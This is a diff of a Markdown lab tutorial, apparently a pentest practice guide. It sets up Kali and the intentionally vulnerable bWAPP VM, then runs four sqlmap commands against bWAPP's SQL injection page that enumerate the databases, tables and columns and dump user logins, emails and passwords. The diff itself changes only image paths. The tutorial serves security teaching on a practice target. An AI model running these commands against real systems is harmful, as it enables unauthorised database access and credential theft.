@@ -2,49 +2,45 @@
 
 1. install Kali and bWAPP vm in virtual box;
 
-   ![](/assets/virtualbox-2-vm)
+   ![](/pentest/VirtualBox-2-VM.png)
 
 2. launch bWAP and make sure it is running;
 
-   ![](/assets/bWAPP-from-vm)
+   ![](/pentest/bWAPP-VM.png)
 
 3. Launch Kali and make sure you can access the bWAPP from Iceweasel.
 
-![](/assets/acces-bWAPP-from-kali)
+![](/pentest/access-bWAPP-from-kali.png)
 
 1. Go to SQL Injection \(GET/Search\)
 
-![](/assets/sql-get)
+![](/pentest/choose-SQL-GET.png)
 
-1. key in a search string; copy of the resulted URL;![](/assets/search-box)
+1. key in a search string; copy of the resulted URL;![](/pentest/key-in-search-box.png)
 
 2. Find out the cookie for the site;
 
-![](/assets/get-cookie-pref)
+![](/pentest/get-cookie-1.png)
 
-![](/assets/get-cookie-id)
+![](/pentest/get-cookie-2.png)
 
 **Now, it is show time; launch SQLmap from terminal;**
 
 **step1 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" --dbs
 
-![](/assets/s1)
+![](/pentest/s1-sql-all-dbs.png)
 
 **step2 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" -D _**bWAPP **_--tables
 
-![](/assets/s2)
+![](/pentest/s2-all-tables.png)
 
 **step3 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" -D _**bWAPP **_-T _**users **_--columns
 
-![](/assets/s3)
+![](/pentest/s3-all-column.png)
 
 **step4 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --
 
 cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" -D bWAPP -T users -C** login,email,password** --dump
 
-![](/assets/s4)
-
-
-
-
+![](/pentest/s4-all-user-pwd.png)
 
